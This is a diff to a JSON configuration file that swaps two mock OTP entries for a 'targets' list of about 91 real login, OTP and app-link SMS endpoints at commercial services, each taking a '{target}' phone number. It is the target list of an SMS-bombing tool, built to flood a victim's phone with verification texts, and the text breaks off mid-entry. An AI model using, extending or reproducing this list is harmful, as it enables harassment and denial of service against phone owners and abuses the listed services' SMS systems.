@@ -1,21 +1,1384 @@
-[
-  {
-    "name": "Mock SMS OTP Service",
-    "method": "POST",
-    "url": "https://api.example.com/v1/auth/send-otp",
-    "headers": {
-      "Content-Type": "application/json",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    },
-    "body_template": "{\"phoneNumber\": \"{target}\", \"channel\": \"sms\"}"
-  },
-  {
-    "name": "Mock Verification Service",
-    "method": "GET",
-    "url": "https://api.example.com/v2/verify?phone={target}",
-    "headers": {
-      "Accept": "application/json"
-    },
-    "body_template": null
-  }
-]
+{
+    "targets": {
+        "phone": {
+            "sms": [
+                {
+                    "name": "sms_api_1",
+                    "method": "POST",
+                    "url": "https://3tex.io/api/1/users/validation/mobile",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_2",
+                    "method": "POST",
+                    "url": "https://3via.ly/api/client/login",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_3",
+                    "method": "POST",
+                    "url": "https://a4baz.com/api/web/login",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_4",
+                    "method": "POST",
+                    "url": "https://abantether.com/users/register/phone/send/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_5",
+                    "method": "POST",
+                    "url": "https://account.api.balad.ir/api/web/auth/login/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_6",
+                    "method": "POST",
+                    "url": "https://admin.zoodex.ir/api/v1/login/check",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_7",
+                    "method": "POST",
+                    "url": "https://agent.wide-app.ir/auth/token",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_8",
+                    "method": "POST",
+                    "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_9",
+                    "method": "POST",
+                    "url": "https://api.anargift.com/api/people/auth",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_10",
+                    "method": "POST",
+                    "url": "https://api.bahramshop.ir/api/user/validate/username",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_11",
+                    "method": "POST",
+                    "url": "https://api.beroozmart.com/api/pub/account/send-otp",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_12",
+                    "method": "POST",
+                    "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_13",
+                    "method": "POST",
+                    "url": "https://api.delitime.ru/api/v2/signup",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_14",
+                    "method": "POST",
+                    "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_15",
+                    "method": "POST",
+                    "url": "https://api.dream11.com/sendsmslink",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_16",
+                    "method": "POST",
+                    "url": "https://api.gotinder.com/v2/auth/sms/send",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_17",
+                    "method": "POST",
+                    "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_18",
+                    "method": "POST",
+                    "url": "https://api.kukala.ir/api/user/Otp",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_19",
+                    "method": "POST",
+                    "url": "https://api.lendo.ir/api/customer/auth/send-otp",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_20",
+                    "method": "POST",
+                    "url": "https://api.nnnow.com/d/api/appDownloadLink",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_21",
+                    "method": "POST",
+                    "url": "https://api.ostadkr.com/login",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_22",
+                    "method": "POST",
+                    "url": "https://api.pindo.ir/v1/user/login-register/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_23",
+                    "method": "POST",
+                    "url": "https://api.pinorest.com/frontend/auth/login/mobile",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_24",
+                    "method": "POST",
+                    "url": "https://api.pooleno.ir/v1/auth/check-mobile",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_25",
+                    "method": "POST",
+                    "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_26",
+                    "method": "POST",
+                    "url": "https://app.itoll.com/api/v1/auth/login",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_27",
+                    "method": "POST",
+                    "url": "https://app.snapp.taxi",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_28",
+                    "method": "POST",
+                    "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_29",
+                    "method": "POST",
+                    "url": "https://app.snapp.taxi/login/?redirect_to\\u003d%2F",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_30",
+                    "method": "POST",
+                    "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/re",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_31",
+                    "method": "GET",
+                    "url": "https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{target}",
+                    "headers": {}
+                },
+                {
+                    "name": "sms_api_32",
+                    "method": "POST",
+                    "url": "https://backend.clamphook.com//auth/register",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_33",
+                    "method": "POST",
+                    "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_34",
+                    "method": "POST",
+                    "url": "https://bekam.ly/api/client/login",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_35",
+                    "method": "POST",
+                    "url": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_36",
+                    "method": "POST",
+                    "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_37",
+                    "method": "POST",
+                    "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_38",
+                    "method": "POST",
+                    "url": "https://cityflo.com/website-app-download-link-sms/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_39",
+                    "method": "POST",
+                    "url": "https://cloud.mail.ru//api/v2/notify/applink",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_40",
+                    "method": "POST",
+                    "url": "https://commonfront.paytm.com/v4/api/sendsms",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_41",
+                    "method": "GET",
+                    "url": "https://core.gap.im/v1/user/add.json?mobile=%2B98{target}",
+                    "headers": {}
+                },
+                {
+                    "name": "sms_api_42",
+                    "method": "POST",
+                    "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_43",
+                    "method": "POST",
+                    "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_44",
+                    "method": "POST",
+                    "url": "https://deniizshop.com/api/v1/sessions/login_request",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_45",
+                    "method": "POST",
+                    "url": "https://drdr.ir/api/v3/auth/login/mobile/init",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_46",
+                    "method": "POST",
+                    "url": "https://farvi.shop/api/v1/sessions/login_request",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_47",
+                    "method": "POST",
+                    "url": "https://fidibo.com/user/login-by-sms",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_48",
+                    "method": "POST",
+                    "url": "https://flightio.com/bff/Authentication/CheckUserKey",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_49",
+                    "method": "POST",
+                    "url": "https://football360.ir/api/auth/verify-phone/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_50",
+                    "method": "POST",
+                    "url": "https://grofers.com/v2/accounts/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_51",
+                    "method": "POST",
+                    "url": "https://gw.taaghche.com/v4/site/auth/login",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_52",
+                    "method": "POST",
+                    "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_53",
+                    "method": "POST",
+                    "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_54",
+                    "method": "POST",
+                    "url": "https://khodro45.com/api/v1/customers/otp/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_55",
+                    "method": "POST",
+                    "url": "https://lingo.ly/api/client/login",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_56",
+                    "method": "POST",
+                    "url": "https://login.housing.com/api/v2/send-otp",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_57",
+                    "method": "POST",
+                    "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_58",
+                    "method": "POST",
+                    "url": "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_59",
+                    "method": "POST",
+                    "url": "https://m.redbus.in/api/getOtp",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_60",
+                    "method": "POST",
+                    "url": "https://member.daraz.com.np/user/api/sendVerificationSms",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_61",
+                    "method": "POST",
+                    "url": "https://messengerg2c4.iranlms.ir/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_62",
+                    "method": "POST",
+                    "url": "https://mobapi.banimode.com/api/v2/auth/request",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_63",
+                    "method": "POST",
+                    "url": "https://mobile-api.qiwi.com/oauth/authorize",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_64",
+                    "method": "POST",
+                    "url": "https://my.newtonschool.co:443/api/v1/user/otp/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_65",
+                    "method": "POST",
+                    "url": "https://nobat.ir/api/public/patient/login/phone",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_66",
+                    "method": "POST",
+                    "url": "https://nx.classino.com/otp/v1/api/login",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_67",
+                    "method": "POST",
+                    "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_68",
+                    "method": "POST",
+                    "url": "https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_69",
+                    "method": "POST",
+                    "url": "https://pharmeasy.in/api/auth/requestOTP",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_70",
+                    "method": "POST",
+                    "url": "https://pinket.com/api/cu/v2/phone-verification",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_71",
+                    "method": "POST",
+                    "url": "https://porter.in/restservice/send_app_link_sms",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_72",
+                    "method": "POST",
+                    "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_73",
+                    "method": "POST",
+                    "url": "https://securedapi.confirmtkt.com/api/platform/register",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_74",
+                    "method": "POST",
+                    "url": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_75",
+                    "method": "POST",
+                    "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_76",
+                    "method": "POST",
+                    "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_77",
+                    "method": "POST",
+                    "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_78",
+                    "method": "POST",
+                    "url": "https://takshopaccessorise.ir/api/v1/sessions/login_request",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_79",
+                    "method": "POST",
+                    "url": "https://tap33.me/api/v2/user",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_80",
+                    "method": "POST",
+                    "url": "https://torob.com",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_81",
+                    "method": "POST",
+                    "url": "https://unacademy.com/api/v1/user/get_app_link/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_82",
+                    "method": "POST",
+                    "url": "https://winmore.ly/api/p10/public/get_started",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_83",
+                    "method": "POST",
+                    "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_84",
+                    "method": "POST",
+                    "url": "https://www.airtel.in/referral-api/core/notify",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_85",
+                    "method": "POST",
+                    "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_86",
+                    "method": "POST",
+                    "url": "https://www.buskool.com/send_verification_code",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_87",
+                    "method": "POST",
+                    "url": "https://www.cashify.in/api/cu01/v1/app-link",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_88",
+                    "method": "POST",
+                    "url": "https://www.delino.com/user/register",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_89",
+                    "method": "POST",
+                    "url": "https://www.flipkart.com/api/5/user/otp/generate",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_90",
+                    "method": "POST",
+                    "url": "https://www.frotels.com/appsendsms.php",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_91",
+                    "method": "POST",
